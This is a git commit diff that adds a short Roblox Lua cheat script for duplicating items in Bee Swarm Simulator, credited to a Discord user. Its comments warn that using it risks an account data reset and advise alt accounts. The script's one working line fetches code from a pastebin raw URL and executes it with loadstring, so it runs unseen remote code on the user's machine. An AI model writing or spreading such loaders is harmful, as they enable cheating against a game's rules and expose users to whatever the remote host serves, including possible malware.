47a815116342071187786aa163e49f94cae7ba4d
Emil Toth <emiltoth1870@gmail.com>
2023-03-07 22:19:57 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Bee Swarm Simulator Paper Plants Dupe.lua
@@ -0,0 +1,7 @@
+-- Credits To PLATINA#3009
+-- Need 25k Honey And 1 Sunflower Seed
+-- Use alt accounts, risk get data reset !
+
+getgenv().Planters = 1 -- Considering capacity
+
+loadstring(game:HttpGet("https://pastebin.com/raw/0HC1eaLC"))()
